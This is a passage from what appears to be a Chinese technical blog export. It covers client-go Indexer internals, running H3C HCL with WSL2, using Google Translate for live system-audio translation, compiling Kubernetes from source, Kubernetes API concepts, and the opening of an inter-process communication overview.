长度为0的时候是一个初始的类型\rreturn \u0026quot;\u0026quot;, KeyError{obj, ErrZeroLengthDeltasObject}\r}\robj = d.Newest().Object // 用最新的一个对象，如果为空则是nil\r}\rif d, ok := obj.(DeletedFinalStateUnknown); ok { return d.Key, nil // 到了这里，之前提到过，是一个过期的值将会被删除\r}\rreturn f.keyFunc(obj) // 调用具体的key计算函数\r}\rIndexer indexer 在整个 client-go 架构中提供了一个具有线程安全的数据存储的对象存储功能；对于Indexer这里会分析下对应的架构及使用方法。\nclient-go/tools/cache/index.go 中可以看到 indexer是一个实现了Store 的一个interface\ntype Indexer interface {\r// 继承了store，拥有store的所有方法\rStore\r// 返回indexname的obj的交集\rIndex(indexName string, obj interface{}) ([]interface{}, error)\r// 通过对 indexName，indexedValue与之相匹配的集合\rIndexKeys(indexName, indexedValue string) ([]string, error)\r// 给定一个indexName 返回所有的indexed\rListIndexFuncValues(indexName string) []string\r// 通过indexname，返回与indexedvalue相关的 obj\rByIndex(indexName, indexedValue string) ([]interface{}, error)\r// 返回所有的indexer\rGetIndexers() Indexers\rAddIndexers(newIndexers Indexers) error\r}\r实际上对他的实现是一个 cache，cache是一个KeyFunc与ThreadSafeStore实现的indexer，有名称可知具有线程安全的功能\ntype cache struct {\rcacheStorage ThreadSafeStore\rkeyFunc KeyFunc\r}\r既然index继承了Store那么，也就是 ThreadSafeStore 必然实现了Store，这是一个基础保证\ntype ThreadSafeStore interface {\rAdd(key string, obj interface{})\rUpdate(key string, obj interface{})\rDelete(key string)\rGet(key string) (item interface{}, exists bool)\rList() []interface{}\rListKeys() []string\rReplace(map[string]interface{}, string)\rIndex(indexName string, obj interface{}) ([]interface{}, error)\rIndexKeys(indexName, indexKey string) ([]string, error)\rListIndexFuncValues(name string) []string\rByIndex(indexName, indexKey string) ([]interface{}, error)\rGetIndexers() Indexers\rAddIndexers(newIndexers Indexers) error\rResync() error // Resync is a no-op and is deprecated\r}\r// KeyFunc是一个生成key的函数，给一个对象，返回一个key值\rtype KeyFunc func(obj interface{}) (string, error)\r那么这个indexer structure可以通过图来很直观的看出来\ncache的结构 cache中会出现三种数据结构，也可以成为三种名词，为 Index , Indexers , Indices\ntype Index map[string]sets.String\rtype Indexers map[string]IndexFunc\rtype Indices map[string]Index\r可以看出：\nIndex 映射到对象，sets.String 也是在API中定义的数据类型 [string]Struct{}， Indexers 是这个 Index 的 IndexFunc , 是一个如何计算Index的keyname的函数 Indices 通过Index 名词拿到对应的对象 这个名词的概念如下，通过图来了解会更加清晰\n从创建开始 创建一个cache有两种方式，一种是指定indexer，一种是默认indexer\n// NewStore returns a Store implemented simply with a map and a lock.\rfunc NewStore(keyFunc KeyFunc) Store {\rreturn \u0026amp;cache{\rcacheStorage: NewThreadSafeStore(Indexers{}, Indices{}),\rkeyFunc: keyFunc,\r}\r}\r// NewIndexer returns an Indexer implemented simply with a map and a lock.\rfunc NewIndexer(keyFunc KeyFunc, indexers Indexers) Indexer {\rreturn \u0026amp;cache{\rcacheStorage: NewThreadSafeStore(indexers, Indices{}),\rkeyFunc: keyFunc,\r}\r}\r更新操作 在indexer中的更新操作（诸如 add , update ），实际上操作的是 updateIndices， 通过在代码可以看出\ntools/cache/thread_safe_store.go 的 77行起，那么就来看下 updateIndices() 具体做了什么\nfunc (c *threadSafeMap) updateIndices(oldObj interface{}, newObj interface{}, key string) {\r// 在操作时，如果有旧对象，需要先删除\rif oldObj != nil {\rc.deleteFromIndices(oldObj, key)\r}\r// 先对整个indexer遍历，拿到index name与 index function\rfor name, indexFunc := range c.indexers {\r// 通过index function，计算出对象的indexed name\rindexValues, err := indexFunc(newObj)\rif err != nil {\rpanic(fmt.Errorf(\u0026quot;unable to calculate an index entry for key %q on index %q: %v\u0026quot;, key, name, err))\r}\r// 接下来通过遍历的index name 拿到这个index的对象\rindex := c.indices[name]\rif index == nil { // 确认这个index是否存在，\rindex = Index{} // 如果不存在将一个Index{}初始化\rc.indices[name] = index\r}\r// 通过计算出的indexed name来拿到对应的 set of object\rfor _, indexValue := range indexValues {\rset := index[indexValue]\rif set == nil {\r// 如果这个set不存在，则初始化这个set\rset = sets.String{}\rindex[indexValue] = set\r}\rset.Insert(key) // 然后将key插入set中\r}\r}\r}\r那么通过上面可以了解到了 updateIndices 的逻辑，那么通过对更新函数分析来看看他具体做了什么？这里是add函数，通过一段代码模拟操作来熟悉结构\ntestIndexer := \u0026quot;testIndexer\u0026quot;\rtestIndex := \u0026quot;testIndex\u0026quot;\rindexers := cache.Indexers{\rtestIndexer: func(obj interface{}) (strings []string, e error) {\rindexes := []string{testIndex} // index的名词\rreturn indexes, nil\r},\r}\rindices := cache.Indices{}\rstore := cache.NewThreadSafeStore(indexers, indices)\rfmt.Printf(\u0026quot;%#v\\n\u0026quot;, store.GetIndexers())\rstore.Add(\u0026quot;retain\u0026quot;, \u0026quot;pod--1\u0026quot;)\rstore.Add(\u0026quot;delete\u0026quot;, \u0026quot;pod--2\u0026quot;)\rstore.Update(\u0026quot;retain\u0026quot;, \u0026quot;pod-3\u0026quot;)\r//lists := store.Update(\u0026quot;retain\u0026quot;, \u0026quot;pod-3\u0026quot;)\rlists := store.List()\rfor _, item := range lists {\rfmt.Println(item)\r}\r这里是对add操作以及对updateIndices() 进行操作\n// threadSafe.go\rfunc (c *threadSafeMap) Add(key string, obj interface{}) {\rc.lock.Lock()\rdefer c.lock.Unlock()\roldObject := c.items[key] // 这个item就是存储object的地方, 为空\rc.items[key] = obj // 这里已经添加了新的值\rc.updateIndices(oldObject, obj, key) // 转至updateIndices\r}\r// updateIndices\rfunc (c *threadSafeMap) updateIndices(oldObj interface{}, newObj interface{}, key string) {\r// 就当是新创建的，这里是空的忽略\rif oldObj != nil {\rc.deleteFromIndices(oldObj, key)\r}\r// 这个时候拿到的就是 name=testKey function=testIndexer\rfor name, indexFunc := range c.indexers {\r// 通过testIndexer对testKey计算出的结果是 []string{testIndexer}\rindexValues, err := indexFunc(newObj)\rif err != nil {\rpanic(fmt.Errorf(\u0026quot;unable to calculate an index entry for key %q on index %q: %v\u0026quot;, key, name, err))\r}\rindex := c.indices[name] if index == nil { index = Index{} // 因为假设为空了，故到这里c.indices[testIndexer]= Index{}\rc.indices[name] = index }\rfor _, indexValue := range indexValues {\r// indexValue=testIndexer\r// set := c.index[name] = c.indices[testIndexer]Index{}\rset := index[indexValue]\rif set == nil {\rset = sets.String{}\rindex[indexValue] = set\r}\rset.Insert(key) // 到这里就为set=indices[testIndexer]Index{}\r}\r}\r}\r总结一下，到这里，可以很明显的看出来，indexer中的三个概念是什么了，前面如果没有看明白话\nIndex：通过indexer计算出key的名称，值为对应obj的一个集合，可以理解为索引的数据结构 比如说 Pod:{\u0026quot;nginx-pod1\u0026quot;: v1.Pod{Name:Nginx}} Indexers ：这个很简单，就是，对于Index中如何计算每个key的名称；可以理解为分词器，索引的过程 Indices 通过Index 名词拿到对应的对象，是Index的集合；是将原始数据Item做了一个索引，可以理解为做索引的具体字段 比如说 Indices[\u0026quot;Pod\u0026quot;]{\u0026quot;nginx-pod1\u0026quot;: v1.Pod{Name:Nginx}, \u0026quot;nginx-pod2\u0026quot;: v1.Pod{Name:Nginx}} Items：实际上存储的在Indices中的set.String{key:value} ，中的 key=value 例如：Item:{\u0026quot;nginx-pod1\u0026quot;: v1.Pod{Name:Nginx}, \u0026quot;coredns-depoyment\u0026quot;: App.Deployment{Name:coredns}} 删除操作 对于删除操作，在最新版本中是使用了 updateIndices 就是 add update delete全都是相同的方法操作，对于旧版包含1.19- 是单独的一个操作\n// v1.2+\rfunc (c *threadSafeMap) Delete(key string) {\rc.lock.Lock()\rdefer c.lock.Unlock()\rif obj, exists := c.items[key]; exists {\rc.updateIndices(obj, nil, key)\rdelete(c.items, key)\r}\r}\r// v1.19-\rfunc (c *threadSafeMap) Delete(key string) {\rc.lock.Lock()\rdefer c.lock.Unlock()\rif obj, exists := c.items[key]; exists {\rc.deleteFromIndices(obj, key)\rdelete(c.items, key)\r}\r}\rindexer使用 上面了解了indexer概念，可以通过写代码来尝试使用一些indexer\npackage main\rimport (\r\u0026quot;fmt\u0026quot;\rappsV1 \u0026quot;k8s.io/api/apps/v1\u0026quot;\rmetav1 \u0026quot;k8s.io/apimachinery/pkg/apis/meta/v1\u0026quot;\r\u0026quot;k8s.io/client-go/tools/cache\u0026quot;\r)\rfunc main() {\rindexers := cache.Indexers{\r\u0026quot;getDeplyment\u0026quot;: func(obj interface{}) (strings []string, e error) {\rd, ok := obj.(*appsV1.Deployment)\rif !ok {\rreturn []string{}, nil\r}\rreturn []string{d.Name}, nil\r},\r\u0026quot;getDaemonset\u0026quot;: func(obj interface{}) (strings []string, e error) {\rd, ok := obj.(*appsV1.DaemonSet)\rif !ok {\rreturn []string{}, nil\r}\rreturn []string{d.Name}, nil\r},\r}\r// 第一个参数是计算set内的key的名称 就是map[string]sets.String的这个strings的名称/namespace/resorcename\r// 第二个参数是计算index即外部的key的名称\rindexer := cache.NewIndexer(cache.MetaNamespaceKeyFunc, indexers)\rdeployment := \u0026amp;appsV1.Deployment{\rObjectMeta: metav1.ObjectMeta{\rName: \u0026quot;nginx-deplyment\u0026quot;,\rNamespace: \u0026quot;test\u0026quot;,\r},\r}\rdaemonset := \u0026amp;appsV1.DaemonSet{\rObjectMeta: metav1.ObjectMeta{\rName: \u0026quot;firewall-daemonset\u0026quot;,\rNamespace: \u0026quot;test\u0026quot;,\r},\r}\rdaemonset2 := \u0026amp;appsV1.DaemonSet{\rObjectMeta: metav1.ObjectMeta{\rName: \u0026quot;etcd-daemonset\u0026quot;,\rNamespace: \u0026quot;default\u0026quot;,\r},\r}\rindexer.Add(deployment)\rindexer.Add(daemonset)\rindexer.Add(daemonset2)\r// 第一个参数是索引器\r// 第二个参数是所引起做索引的字段\rlists, _ := indexer.ByIndex(\u0026quot;getDaemonset\u0026quot;, \u0026quot;etcd-daemonset\u0026quot;)\rfor _, item := range lists {\rswitch item.(type) {\rcase *appsV1.Deployment:\rfmt.Println(item.(*appsV1.Deployment).Name)\rcase *appsV1.DaemonSet:\rfmt.Println(item.(*appsV1.DaemonSet).Name)\r}\r}\r}\r","permalink":"https://www.oomkill.com/2022/05/ch06-client-go/","summary":"","title":"Kubernetes组件核心 - client-go"},{"content":"背景 由于Windows10 开启WSL2后无法和 eNSP 做到兼容，但是 H3C HCL 在版本 HCL_v2.1.2.1 提供了 VirtualBox 6.0.14 作为虚拟化后端，理论上来说可以做到 WSL2 与 HCL 共存。\n并且开启了WSL2后并于其他虚拟化平台（VirtualBox, Vmvare）做到兼容的情况下，这种情况大部分禁止套娃（虚拟化下在虚拟化），通过安装虚拟机的方式再安装 eNSP 发现启动不报错，但是很长时间起不来。\nNotes [1]：HCL官方给的建议是，对于windows7装的版本为HCL_v2.1.1；对于Windows10 并且开启了 Hype-v 或者 Dokcer-Desktop，推荐使用 HCL_v3.0.1.1\n下载地址：HCL Download\n安装过程 下载好安装时，直接下一步直至完成即可，VirtualBox已被内嵌至安装包内了。\n图：HCL安装界面 Notes：如果需要抓包，自行安装Wireshark，安装好后，在HCL设置中配置 wireshark.exe 的路径即可\nVirtualBox启用hyper-v支持 [2] 进入VirtualBox安装目录, 确定当前目录下存在VBoxManage.exe文件, 在当前目录打开powershell. 或者你将VBoxManage.exe所在目录加入环境变量, 任意路径下打开powershell.\n# 或指定vbox所有虚拟系统开启 ./VBoxManage.exe setextradata global \u0026quot;VBoxInternal/NEM/UseRing0Runloop\u0026quot; 0 开启后，HCL所有的设备就工作正常了，这种情况下也不用牺牲WSL2或者Dokcer-Desktop。因为eNSP官方没有再更新，导致hype-v与VirtualBox无法兼容，暂时无解。\nReference [1] H3C Cloud Lab\n[2] Windows 10 (2004) 启用wsl2, 并与VirtualBox 6.0+共存\n","permalink":"https://www.oomkill.com/2022/05/h3c-hcl-preparation/","summary":"","title":"H3C Cloud与WSL2共存"},{"content":" Notes：伟大的CCP ban了google翻译需要翻墙（不是translate.cn退出中国 .cn一直只有文字翻译）语音翻译地址一直被ban\n疫情期间上网课，对于英语听力较差或者需要观看英文视频，但实际上并没有双语字幕的这种情况下需要找一个实时的翻译工具。虽然说手机上此类软件比较多，但电脑上没有特别合适的应用可以做为一个免费实时翻译。哪怕是收费翻译工具实际上翻译效果也是很差，并且语种比较单一。\n电脑端有一个 speechlogger，可以做到实时翻译，但实际上也是使用的Google翻译，那么实际上我们就可以直接使用Google翻译作为一个同声翻译电脑的声音。\n此时就遇到一个问题，就是Google翻译无法识别到电脑的声音，只能识别到麦克风的声音。这里就需要将电脑输出的作为麦克风的输出。使用Windows电脑的可以尝试以下操作。\n以windows电脑为例：\nStep 1：电脑右下角调整音量图标，右键选择声音\nStep2：选择录音设备，立体声混音，将其启动并设置为默认设备（可选）\nStep3：右键属性，选择侦听，通过此设备播放选择扬声器对应的设备。\nTips：注意，无用选择侦听此设备，这个选项勾选后的意思是，你可以通过扬声器听到扬声器声音，此时会发生混音。影响我们听到的效果。\nStep4：可选步骤，如果Step2没有设置为默认设备，可以在浏览器选择对应的设备作为麦克风，如使用了立体声混音作为电脑的输入设备，那么不是默认设备情况下在浏览器选择该设备作为输入设备即可。\nTips：Google翻译的语音翻译功能貌似只能在Chrome里使用，其他有可能会出现无法使用语音设备的功能\n这样就做到了一个免费，无杂音，多语种的同声翻译，不管是上网课学习，还是说做笔记（同语言下还可以作为声音转换为文字）都是一个很不错的选择。\n后面再说下，科大讯飞的录音设备实际上翻译功能很差，语种也少，并且专业术语翻译的很烂，最便宜的小2000块钱，大量依赖云服务，实际上可以不用买这种产品，我是已经买过体验的，翻译结果实际上比Google翻译要差。如果不是在现场，没有网络或者声音很嘈杂（他的十几个麦克风其实效果也不咋地）的情况下可以选择其他方案，例如Google的同声翻译。\n如果你需要对翻译的结果划分角色的话，还是可以使用 speechlogger，这个也是使用的Google翻译作为翻译引擎的\nReference\n如何将电脑的输出作为电脑麦克风的输入\n免费的实时翻译工具\n","permalink":"https://www.oomkill.com/2022/05/google-interpretation/","summary":"","title":"PC端利用google翻译实现同声翻译"},{"content":"本地构建 选择要构建的版本 git checkout tags/v1.19.5 将依赖包复制到对应路径下 cp staging/src/k8s.io vendor/ 调整makefile 在windows上编译的克隆下可能文件编码变了，需要手动修改下文件编码。比如说出现 \\r not found 类似关键词时\n这里转换编码使用了 dos2unix，需要提前安装下\napt install dos2unix 转换原因是因为对于bash 脚本执行识别不了windows的换行\nfind . -name '*.sh' -exec dos2unix {} \\; 然后将 build/root/ 的文件复制到项目根目录\ncp build/root/Makefile* ./ 编译 查看帮助 make help\n编译 make all WHAT=cmd/kube-apiserver GOFLAGS=-v\nWHAT=cmd/kube-apiserver 为仅编译单一组件，all 为所有的组件\n还可以增加其他的一些环境变量 KUBE_BUILD_PLATFORMS= 如编译的平台\n更多的可以 make help 查看帮助\n编译中问题 Makefile:93: recipe for target \u0026lsquo;all\u0026rsquo; failed\n!!! [0515 21:32:52] Call tree: !!! [0515 21:32:52] 1: /mnt/d/src/go_work/src/kubernetes/hack/lib/golang.sh:717 kube::golang::build_some_binaries(...) !!! [0515 21:32:52] 2: /mnt/d/src/go_work/src/kubernetes/hack/lib/golang.sh:861 kube::golang::build_binaries_for_platform(...) !!! [0515 21:32:52] 3: hack/make-rules/build.sh:27 kube::golang::build_binaries(...) !!! [0515 21:32:52] Call tree: !!! [0515 21:32:52] 1: hack/make-rules/build.sh:27 kube::golang::build_binaries(...) !!! [0515 21:32:52] Call tree: !!! [0515 21:32:52] 1: hack/make-rules/build.sh:27 kube::golang::build_binaries(...) Makefile:93: recipe for target 'all' failed 这里看报错根本不知道发生什么问题，使用 strace 追送了下，很明显看到是没有gcc\ncgo: exec gcc: exec: \u0026ldquo;gcc\u0026rdquo;: executable file not found in $PATH\nrt_sigprocmask(SIG_BLOCK, [HUP INT QUIT TERM XCPU XFSZ], NULL, 8) = 0 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7fbf45410a10) = 17890 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0 wait4(-1, +++ [0515 21:34:40] Building go targets for linux/amd64: cmd/kubelet k8s.io/kubernetes/vendor/github.com/opencontainers/runc/libcontainer/system k8s.io/kubernetes/vendor/github.com/mindprince/gonvml # k8s.io/kubernetes/vendor/github.com/opencontainers/runc/libcontainer/system cgo: exec gcc: exec: \u0026quot;gcc\u0026quot;: executable file not found in $PATH # k8s.io/kubernetes/vendor/github.com/mindprince/gonvml cgo: exec gcc: exec: \u0026quot;gcc\u0026quot;: executable file not found in $PATH !!! [0515 21:34:42] Call tree: !!! [0515 21:34:42] 1: /mnt/d/src/go_work/src/kubernetes/hack/lib/golang.sh:717 kube::golang::build_some_binaries(...) !!! [0515 21:34:42] 2: /mnt/d/src/go_work/src/kubernetes/hack/lib/golang.sh:861 kube::golang::build_binaries_for_platform(...) !!! [0515 21:34:42] 3: hack/make-rules/build.sh:27 kube::golang::build_binaries(...) !!! [0515 21:34:42] Call tree: !!! [0515 21:34:42] 1: hack/make-rules/build.sh:27 kube::golang::build_binaries(...) !!! [0515 21:34:42] Call tree: !!! [0515 21:34:42] 1: hack/make-rules/build.sh:27 kube::golang::build_binaries(...) [{WIFEXITED(s) \u0026amp;\u0026amp; WEXITSTATUS(s) == 1}], 0, NULL) = 17890 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=17890, si_uid=0, si_status=1, si_utime=0, si_stime=0} --- rt_sigreturn({mask=[]}) = 17890 openat(AT_FDCWD, \u0026quot;/usr/share/locale/C.UTF-8/LC_MESSAGES/make.mo\u0026quot;, O_RDONLY) = -1 ENOENT (No such file or directory) openat(AT_FDCWD, \u0026quot;/usr/share/locale/C.utf8/LC_MESSAGES/make.mo\u0026quot;, O_RDONLY) = -1 ENOENT (No such file or directory) openat(AT_FDCWD, \u0026quot;/usr/share/locale/C/LC_MESSAGES/make.mo\u0026quot;, O_RDONLY) = -1 ENOENT (No such file or directory) openat(AT_FDCWD, \u0026quot;/usr/share/locale-langpack/C.UTF-8/LC_MESSAGES/make.mo\u0026quot;, O_RDONLY) = -1 ENOENT (No such file or directory) openat(AT_FDCWD, \u0026quot;/usr/share/locale-langpack/C.utf8/LC_MESSAGES/make.mo\u0026quot;, O_RDONLY) = -1 ENOENT (No such file or directory) openat(AT_FDCWD, \u0026quot;/usr/share/locale-langpack/C/LC_MESSAGES/make.mo\u0026quot;, O_RDONLY) = -1 ENOENT (No such file or directory) fstat(1, {st_mode=S_IFCHR|0640, st_rdev=makedev(4, 1), ...}) = 0 ioctl(1, TCGETS, {B38400 opost isig icanon echo ...}) = 0 write(1, \u0026quot;Makefile:93: recipe for target '\u0026quot;..., 44Makefile:93: recipe for target 'all' failed ) = 44 write(2, \u0026quot;make: *** [all] Error 1\\n\u0026quot;, 24make: *** [all] Error 1 ) = 24 rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT TERM XCPU XFSZ], NULL, 8) = 0 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0 chdir(\u0026quot;/mnt/d/src/go_work/src/kubernetes\u0026quot;) = 0 close(1) = 0 exit_group(2) = ? +++ exited with 2 +++ 修改后编译问题可以明显看出是哪里\n如尝试增加一种资源类型后编译，这种类型的错误可以根据报错提示进行修改\n+++ [0515 21:47:59] Building go targets for linux/amd64: cmd/kube-apiserver k8s.io/kubernetes/vendor/k8s.io/api/apps/v1 # k8s.io/kubernetes/vendor/k8s.io/api/apps/v1 vendor/k8s.io/api/apps/v1/register.go:48:3: cannot use \u0026amp;StateDeploy{} (type *StateDeploy) as type runtime.Object in argument to scheme.Ad dKnownTypes: *StateDeploy does not implement runtime.Object (missing DeepCopyObject method) !!! [0515 21:48:01] Call tree: !!! [0515 21:48:01] 1: /mnt/d/src/go_work/src/kubernetes/hack/lib/golang.sh:706 k ","permalink":"https://www.oomkill.com/2022/05/ch11-code-compile/","summary":"","title":"如何通过源码编译Kubernetes"},{"content":"APIServer 在kubernetes架构概念层面上，Kubernetes由一些具有不同角色的服务节点组成。而master的控制平面由 Apiserver Controller-manager 和 Scheduler 组成。\nApiserver 从概念上理解可以分为 api 和 object 的集合，api 可以理解为，处理读写请求来修改相应 object 的组件；而 object 可以表示为 kubernetes 对象，如 Pod， Deployment 等 。\n基于声明式的API 在命令式 API 中，会直接发送要执行的命令，例如：运行、停止 等命令。在声明式API 中，将声明希望系统执行的操作，系统将不断将自身状态朝希望状态改变。\n为什么使用声明式 在分布式系统中，任何组件随时都可能发生故障，当组件故障恢复时，需要明白自己需要做什么。在使用命令式时，出现故障的组件可能在异常时错过调用，并且在恢复时需要其他外部组件进行干预。而声明式仅需要在恢复时确定当前状态以确定他需要做什么。\nExternal APIs 在kubernetes中，控制平面是透明的，及没有internal APIs。这就意味着Kubernetes组件间使用相同的API交互。这里通过一个例子来说明外部APIs与声明式的关系。\n例如，创建一个Pod对象，Scheduler 会监听 API来完成创建，创建完成后，调度程序不会命令被分配节点启动Pod。而在kubelet端，发现pod具有与自己相同的一些信息时，会监听pod状态。如改变kubelet则修改状态，如果删除掉Pod（对象资源不存在与API中），那么kubelet则将终止他。\n为什么不使用Internal API 使用External API可以使kubernetes组件都使用相同的API，使得kubernetes具有可扩展性和可组合性。对于kubernetes中任何默认组件，如不足满足需求时，都可以更换为使用相同API的组件。\n另外，外部API还可轻松的使用公共API来扩展kubernetes的功能\nAPI资源 从广义上讲，kubernetes对象可以用任何数据结构来表示，如：资源实例、配置（审计策略）或持久化实体（Pod）；在使用中，常见到的就是对应YAML的资源清单。转换出来就是RESTful地址，那么应该怎么理解这个呢？即，对资源的动作（操作）如图所示。但如果需要了解Kubernetes API需要掌握一些概念才可继续。\nGroup 出于对kubernetes扩展性的原因，将资源类型分为了API组进行独立管理，可以通过 kubectl api-resources查看。在代码部分为 vendor/k8s.io/api\n也可以通过 kubectl xxx -v 6 来查看 kubectl 命令进行了那些API调用\n$ kubectl get pods -v 6 I0513 21:54:33.250752 38661 round_trippers.go:444] GET http://localhost:8080/api?timeout=32s 200 OK in 1 milliseconds I0513 21:54:33.293831 38661 round_trippers.go:444] GET http://localhost:8080/apis?timeout=32s 200 OK in 0 milliseconds I0513 21:54:33.299741 38661 round_trippers.go:444] GET http://localhost:8080/apis/discovery.k8s.io/v1beta1?timeout=32s 200 OK in 3 milliseconds I0513 21:54:33.301097 38661 round_trippers.go:444] GET http://localhost:8080/apis/autoscaling/v2beta1?timeout=32s 200 OK in 4 milliseconds I0513 21:54:33.301128 38661 round_trippers.go:444] GET http://localhost:8080/apis/authorization.k8s.io/v1beta1?timeout=32s 200 OK in 3 milliseconds I0513 21:54:33.301222 38661 round_trippers.go:444] GET http://localhost:8080/apis/rbac.authorization.k8s.io/v1beta1?timeout=32s 200 OK in 1 milliseconds I0513 21:54:33.301238 38661 round_trippers.go:444] GET http://localhost:8080/apis/authentication.k8s.io/v1beta1?timeout=32s 200 OK in 4 milliseconds I0513 21:54:33.301280 38661 round_trippers.go:444] GET http://localhost:8080/apis/certificates.k8s.io/v1beta1?timeout=32s 200 OK in 4 milliseconds .... No resources found in default namespace. Kind 在kubectl api-resources 中可以看到，有Kind字段，大部分人通常会盲目的 kubectl apply ,这导致了，很多人以为 kind 实际上为资源名称，Pod ，Deployment 等。\n根据 api-conventions.md 的说明，Kind 是对象模式，包含三种类型：\nObject，代表系统中持久化数据资源，如，Service, Namespace, Pod等 List，是一个或多个资源的集合，通常以List结尾，如 DeploymentList 对Object的操作和和非持久化实体，如，当发生错误时会返回“status”类型，并不会持久化该数据。 Object 对象是Kubernetes中持久化的实体，也就是保存在etcd中的数据；如：Replicaset , Configmap 等。这个对象代表的了集群期望状态和实际状态。\n例如：创建了Pod，kubernetes集群会调整状态，直到相应的容器在运行\nKubernetes资源又代表了对象，对象必须定义一些字段：\n所有对象必须具有以下字段： Kind apiVersion metadata spec：期望的状态 status：实际的状态 API Link 前面讲到的 kubectl api-resources 展示的列表不能完整称为API资源，而是已知类型的kubernetes对象，要对展示这个API对象，需要了解其完整的周期。以 kubectl get --raw / 可以递归查询每个路径。\nkubectl get --raw / { \u0026quot;paths\u0026quot;: [ \u0026quot;/api\u0026quot;, \u0026quot;/api/v1\u0026quot;, \u0026quot;/apis\u0026quot;, \u0026quot;/apis/\u0026quot;, \u0026quot;/apis/admissionregistration.k8s.io\u0026quot;, \u0026quot;/apis/admissionregistration.k8s.io/v1\u0026quot;, \u0026quot;/apis/admissionregistration.k8s.io/v1beta1\u0026quot;, \u0026quot;/apis/apiextensions.k8s.io\u0026quot;, \u0026quot;/apis/apiextensions.k8s.io/v1\u0026quot;, ... 对于一个Pod来说，其查询路径就为 /api/v1/namespaces/kube-system/pods/coredns-f9bbb4898-7zkbf\nkubectl get --raw /api/v1/namespaces/kube-system/pods/coredns-f9bbb4898-7zkbf|jq kind: Pod apiVersion: v1 metadata: {} spec:{} status: {} 但有一些资源对象也并非这种结构，如 configMap ，因其只是存储的数据，所以没有 spec 和 status\nkubectl get --raw /api/v1/namespaces/kube-system/configmaps/coredns|jq kind apiVersion metadata data API组成 一个API的组成为 一个 API 组Group , 一个版本 Version , 和一个资源 Resource ; 简称为 GVR\n转换为实际的http路径为：\n/api/{version}/namespaces/{namespace_name}/resourcesPlural/{actual_resources_name} /api/v1/namespaces/default/pods/pods123 而GVR中的R代表的是RESTful中的资源，转换为Kubernetes中资源应为 Kind，简称为 GVK，K在URI中表示在：\n/apis/{GROUP}/{VERSION}/namespaces/{namespace}/{KIND} 请求和处理 这里讨论API请求和处理，API的一些数据结构位于 k8s.io/api ，并处理集群内部与外部的请求，而Apiserver 位于 k8s.io/apiserver/pkg/server 提供了http服务。\n那么，当 HTTP 请求到达 Kubernetes API 时，实际上会发生什么？\n首先HTTP请求在 DefaultBuildHandlerChain （可以参考k8s.io/apiserver/pkg/server/config.go）中注册filter chain，过滤器允许并将相应的信息附加至 ctx.RequestInfo; 如身份验证的相应 k8s.io/apiserver/pkg/server/mux 将其分配到对应的应用 k8s.io/apiserver/pkg/server/routes 定义了REST与对应应用相关联 k8s.io/apiserver/pkg/endpoints/groupversion.go.InstallREST() 接收上下文，从存储中传递请求的对象。 Reference\nKubernetes API 基础——资源、种类和对象\nKubernetes - 一个 API 统治\nDesign and implementation\nExtending-the-Kubernetes-API\nKubernetes 深入探讨\n","permalink":"https://www.oomkill.com/2022/05/ch02-kubernetes-api/","summary":"","title":"深入理解kubernetes API"},{"content":"Overview 进程间是相互保持独立的，内存管理中，就是保护进程的地址空间不被其他进程访问。而进程间通信 ( Inter-process Communication IPC) 用于在一个或多个进程间交换数据\n进程间合作是那些可以影响或受其他过程影响的过程。例如网站包含 JS、H5、Flash，当有一个相应缓慢时，会发生整个网站的布局或其他功能的展示。\n通常情况下进程间合作被允许的原因有：\n信息共享：多个进程需要访问同一个文件。（如管道）\n计算加速：将复杂功能拆分为多个子任务（多处理器时效果更佳），可以更快地解决问题\n模块化：将整体系统架构分为不同功能模块，模块间相互协作\n便利：单用户可以同时多任务处理，如 编辑、编译、打印等\nCommunications model (a) 消息队列（间接通信） \u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;(b) 共享内存（直接通信） Message Passing IPC背后关键的一点是消息的传递，即一个进程发消息，一个进程接收消息\n而为了使进程间通信，就必须在进程间建立连接，连接可以是单/双向。连接可以使用直接通信和间接通信来实现\nDirect Communication 直接通信，必须明确声明发送者或接收者的名称，通常定义为：\nSend(P, message)：发送信息到进程 P Receive(Q, message)：接收来自进程 Q 的信息 在直接通信中，一般连接的属性有以下特征：\n一个链路与一对进程相关联 自动建立链接 链接是通用的双向链接 Indirect Communication 间接通信，为异步通信，通常情况下互通信都需要有消息队列；发送者将信息放置消息队列中，接受者从消息队列中取出消息\nSend(P, message)：像消息队列发送消息 Receive(Q, message)：接受消息队列中的消息 每个进程都有唯一ID 共享一个消息队列 在间接通信中，一般连接的属性有以下特征：\n一对进程共享消息队列时，才会在进程之间建立链接 链接可以被许多进程关联 链接可以是单向也可以是双向 每个进程可以有多个链接 \u0026nbsp;\u0026nbsp;直接通信\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;间接通信 Synchronization 从另一方面来讲，消息传递可以是阻塞 Blocking 或非阻塞 Non-Blocking 的；同步 synchronous 会阻塞一个进程，直到发送完成。异步 asynchronous 则是是非阻塞的，发送操作完成后会立即返回不等待返回结果\nBuffer 消息通过队列传递，队列的容量则具有下列三种配置之一：\n0容量：消息不能存储在队列中，因此发送者必须阻塞，直到接收者接受消息 有限容量：队列中有一定的预先约定大小的容量。如果队列已满，发送者必须阻塞，直到队列中有可用空间（反之为空，接受者阻塞），否则可能是阻塞的或非阻塞的 